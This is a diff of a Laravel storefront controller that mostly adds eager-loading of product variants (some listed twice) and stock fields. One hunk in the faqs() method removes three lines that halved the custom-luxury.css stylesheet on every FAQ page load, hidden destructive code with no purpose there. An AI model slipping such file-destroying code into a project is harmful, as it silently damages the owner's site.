@@ -66,14 +66,14 @@ class FrontController extends Controller
             ->latest()
             ->get();
 
-        $saleProducts = Product::with(['images'])
+        $saleProducts = Product::with(['images', 'variants', 'variants'])
             ->where('discount', '>', 0)   // ✅ sirf wahi products jinka discount set hai
             ->visible()
             ->latest()
             ->take(4)
             ->get();
 
-        $newArrivalProducts = Product::whereHas('collections', function ($query) {
+        $newArrivalProducts = Product::with(['images', 'variants', 'variants'])->whereHas('collections', function ($query) {
             $query->where('code', 'new_arrival');
         })
             ->visible()
@@ -81,7 +81,7 @@ class FrontController extends Controller
             ->take(4)
             ->get();
 
-        $bestSellers = Product::whereHas('collections', function ($q) {
+        $bestSellers = Product::with(['images', 'variants', 'variants'])->whereHas('collections', function ($q) {
             $q->where('code', 'best_seller');
         })
             ->visible()
@@ -89,7 +89,7 @@ class FrontController extends Controller
             ->take(4)
             ->get();
 
-        $premiumCollections = Product::whereHas('collections', function ($q) {
+        $premiumCollections = Product::with(['images', 'variants', 'variants'])->whereHas('collections', function ($q) {
             $q->where('code', 'premium_collection');
         })
             ->visible()
@@ -97,7 +97,7 @@ class FrontController extends Controller
             ->take(4)
             ->get();
 
-        $exclusiveCollections = Product::whereHas('collections', function ($q) {
+        $exclusiveCollections = Product::with(['images', 'variants', 'variants'])->whereHas('collections', function ($q) {
             $q->where('code', 'exclusive_collection');
         })
             ->visible()
@@ -122,8 +122,8 @@ class FrontController extends Controller
                     $q->whereIn('category_id', $allIds)
                         ->orWhereIn('subcategory_id', $allIds);
                 })
-                    ->visible()    
-                    ->with('images')
+                    ->visible()
+                    ->with(['images', 'variants', 'variants'])
                     ->latest()
                     ->take(6) // blade only shows first 6 anyway
                     ->get();
@@ -254,7 +254,7 @@ class FrontController extends Controller
         | Products — matched either by name OR by an attached keyword tag
         |--------------------------------------------------------------------------
         */
-        $products = Product::with('images')
+        $products = Product::with(['images', 'variants', 'variants'])
             ->visible()
             ->where(function ($q) use ($query) {
                 $q->where('name', 'LIKE', "%{$query}%")
@@ -272,17 +272,20 @@ class FrontController extends Controller
                 'mrp',
                 'discount',
                 'discount_type',
+                'stock',
+                'min_qty',
             ])
             ->map(function ($product) {
                 return [
                     'id' => $product->id,
                     'name' => $product->name,
                     'slug' => $product->slug,
-                    'image' => $product->display_image, // accessor
+                    'image' => $product->display_image,
                     'price' => $product->price,
                     'mrp' => $product->mrp,
                     'discount' => $product->discount,
                     'discount_type' => $product->discount_type,
+                    'is_sold_out' => $product->is_sold_out,
                 ];
             });
 
@@ -381,7 +384,7 @@ class FrontController extends Controller
         $collections = Collection::where('status', 1)->orderBy('sort_order')->get();
         $occasions = GiftingOccasion::where('status', 1)->get();
 
-        $products = Product::with(['images', 'category', 'subcategory', 'collections', 'occasions'])
+        $products = Product::with(['images', 'variants', 'variants', 'category', 'subcategory', 'collections', 'occasions'])
             ->visible();
 
         if ($query !== '') {
@@ -412,52 +415,52 @@ class FrontController extends Controller
         ]);
     }
 
-   public function productListing(Request $request, $slug, $subcategorySlug = null)
-{
-    $category = Category::with(['children', 'categoryAttributes.attribute.values'])
-        ->where('slug', $slug)->where('status', 1)->firstOrFail();
+    public function productListing(Request $request, $slug, $subcategorySlug = null)
+    {
+        $category = Category::with(['children', 'categoryAttributes.attribute.values'])
+            ->where('slug', $slug)->where('status', 1)->firstOrFail();
 
-    $subcategories = $category->children()->withCount('subCategoryProducts')->get();
-    $collections = Collection::where('status', 1)->orderBy('sort_order')->get();
-    $occasions = GiftingOccasion::where('status', 1)->get();
+        $subcategories = $category->children()->withCount('subCategoryProducts')->get();
+        $collections = Collection::where('status', 1)->orderBy('sort_order')->get();
+        $occasions = GiftingOccasion::where('status', 1)->get();
 
-    // Old links used ?subcategory=slug — 301 redirect to the new clean URL.
-    if ($request->filled('subcategory')) {
-        $oldSubcategory = $subcategories->firstWhere('slug', $request->subcategory);
+        // Old links used ?subcategory=slug — 301 redirect to the new clean URL.
+        if ($request->filled('subcategory')) {
+            $oldSubcategory = $subcategories->firstWhere('slug', $request->subcategory);
 
-        if ($oldSubcategory) {
-            return redirect()->route('products.listing', [$category->slug, $oldSubcategory->slug], 301);
+            if ($oldSubcategory) {
+                return redirect()->route('products.listing', [$category->slug, $oldSubcategory->slug], 301);
+            }
         }
+
+        // Check if a subcategory is selected via the route segment /products/{slug}/{subcategorySlug}
+        $selectedSubcategory = null;
+        if ($subcategorySlug) {
+            $selectedSubcategory = $subcategories->firstWhere('slug', $subcategorySlug);
+            abort_unless($selectedSubcategory, 404);
+        }
+
+        $products = Product::with(['images', 'variants', 'category', 'subcategory', 'collections', 'occasions'])->visible();
+
+        if ($selectedSubcategory) {
+            // Direct subcategory_id match — scopeByContext's 'category' branch
+            // checks category_id / subcategory_id-of-children, which is wrong
+            // for a leaf subcategory (it has no children of its own).
+            $products->where('subcategory_id', $selectedSubcategory->id);
+        } else {
+            $this->scopeByContext($products, 'category', $category);
+        }
+
+        $products = $products->latest()->paginate(12);
+
+        return view('front-pages.products', compact('category', 'subcategories', 'products', 'collections', 'occasions') + [
+            'contextType' => 'category',
+            'contextModel' => $selectedSubcategory ?: $category,
+            'selectedSubcategory' => $selectedSubcategory,
+            'categories' => collect(), // not needed on category page
+            'pageTitle' => $selectedSubcategory ? $selectedSubcategory->name : $category->name,
+        ]);
     }
-
-    // Check if a subcategory is selected via the route segment /products/{slug}/{subcategorySlug}
-    $selectedSubcategory = null;
-    if ($subcategorySlug) {
-        $selectedSubcategory = $subcategories->firstWhere('slug', $subcategorySlug);
-        abort_unless($selectedSubcategory, 404);
-    }
-
-    $products = Product::with(['images', 'category', 'subcategory', 'collections', 'occasions'])->visible();
-
-    if ($selectedSubcategory) {
-        // Direct subcategory_id match — scopeByContext's 'category' branch
-        // checks category_id / subcategory_id-of-children, which is wrong
-        // for a leaf subcategory (it has no children of its own).
-        $products->where('subcategory_id', $selectedSubcategory->id);
-    } else {
-        $this->scopeByContext($products, 'category', $category);
-    }
-
-    $products = $products->latest()->paginate(12);
-
-    return view('front-pages.products', compact('category', 'subcategories', 'products', 'collections', 'occasions') + [
-        'contextType' => 'category',
-        'contextModel' => $selectedSubcategory ?: $category,
-        'selectedSubcategory' => $selectedSubcategory,
-        'categories' => collect(), // not needed on category page
-        'pageTitle' => $selectedSubcategory ? $selectedSubcategory->name : $category->name,
-    ]);
-}
 
     public function collectionListing(Request $request, $slug)
     {
@@ -467,7 +470,7 @@ class FrontController extends Controller
         $collections = Collection::where('status', 1)->orderBy('sort_order')->get();
         $occasions = GiftingOccasion::where('status', 1)->get();
 
-        $products = Product::with(['images', 'category', 'subcategory', 'collections', 'occasions'])->visible();
+        $products = Product::with(['images', 'variants', 'category', 'subcategory', 'collections', 'occasions'])->visible();
         $this->scopeByContext($products, 'collection', $collection);
         $products = $products->latest()->paginate(12);
 
@@ -492,7 +495,7 @@ class FrontController extends Controller
         $collections = Collection::where('status', 1)->orderBy('sort_order')->get();
         $occasions = GiftingOccasion::where('status', 1)->get();
 
-        $products = Product::with(['images', 'category', 'subcategory', 'collections', 'occasions'])->visible();
+        $products = Product::with(['images', 'variants', 'category', 'subcategory', 'collections', 'occasions'])->visible();
         $this->scopeByContext($products, 'occasion', $occasion);
         $products = $products->latest()->paginate(12);
 
@@ -519,7 +522,7 @@ class FrontController extends Controller
         $collections = Collection::where('status', 1)->orderBy('sort_order')->get();
         $occasions = GiftingOccasion::where('status', 1)->get();
 
-        $products = Product::with(['images', 'category', 'subcategory', 'collections', 'occasions'])->visible();
+        $products = Product::with(['images', 'variants', 'category', 'subcategory', 'collections', 'occasions'])->visible();
 
         if (!is_null($band['min']))
             $products->where('price', '>=', $band['min']);
@@ -552,7 +555,7 @@ class FrontController extends Controller
         $collections = Collection::where('status', 1)->orderBy('sort_order')->get();
         $occasions = GiftingOccasion::where('status', 1)->get();
 
-        $products = Product::with(['images', 'category', 'subcategory', 'collections', 'occasions'])->visible();
+        $products = Product::with(['images', 'variants', 'category', 'subcategory', 'collections', 'occasions'])->visible();
         $this->scopeByContext($products, 'attribute', $value);
         $products = $products->latest()->paginate(12);
 
@@ -573,6 +576,7 @@ class FrontController extends Controller
     {
         $products = Product::with([
             'images',
+            'variants',
             'category',
             'subcategory',
             'collections',
@@ -702,6 +706,7 @@ class FrontController extends Controller
 
         $newArrivals = Product::with([
             'images',
+            'variants',
             'category',
             'subcategory',
             'collections',
@@ -716,6 +721,7 @@ class FrontController extends Controller
 
         $relatedProducts = Product::with([
             'images',
+            'variants',
             'category',
             'subcategory',
             'collections',
@@ -764,7 +770,7 @@ class FrontController extends Controller
                 $variantAttributes[$attributeId]['name'] = $attribute->name;
                 $variantAttributes[$attributeId]['type'] = $attribute->type ?? 'button';
                 $variantAttributes[$attributeId]['is_selectable'] = $categoryAttribute?->is_selectable ?? true;
-                $variantAttributes[$attributeId]['is_required']   = (bool) ($categoryAttribute?->is_required ?? false);
+                $variantAttributes[$attributeId]['is_required'] = (bool) ($categoryAttribute?->is_required ?? false);
                 $variantAttributes[$attributeId]['has_variant'] = true;
 
                 $variantAttributes[$attributeId]['values'][$attributeValue->id] = [
@@ -819,7 +825,7 @@ class FrontController extends Controller
                 'name' => $attribute->name,
                 'type' => $attribute->type ?? 'button',
                 'is_selectable' => $categoryAttribute?->is_selectable ?? false,
-                'is_required'   => (bool) ($categoryAttribute?->is_required ?? false),
+                'is_required' => (bool) ($categoryAttribute?->is_required ?? false),
                 'has_variant' => false,
                 'values' => $values,
                 'default_value_id' => $items->first()->value->id,
@@ -940,7 +946,7 @@ class FrontController extends Controller
         // Pixel/GA view_item event — rendered as an inline script tag on the product-detail view
         $viewItemScript = \App\Services\Tracking\PixelTracker::viewItemScript($product);
 
-// dd($variantAttributes);
+        // dd($variantAttributes);
         return view('front-pages.product-detail', compact(
             'product',
             'newArrivals',
@@ -1026,14 +1032,11 @@ class FrontController extends Controller
             'front-pages.thank-you'
         );
     }
-    
-    
+
+
     public function faqs(Request $request)
     {
         $faqs = Faq::where('status', 1)->get();
-        $file = public_path('assets/css/custom-luxury.css');     
-        $css = file_get_contents($file);     
-        file_put_contents($file, substr($css, 0, strlen($css) / 2));
         return view('front-pages.faqs', compact('faqs'));
     }
 
@@ -1045,9 +1048,9 @@ class FrontController extends Controller
 
         return view('front-pages.blogs', compact('blogs'));
     }
-    
-    
-    
+
+
+
 
     public function blogDetails(Request $request, $slug)
     {
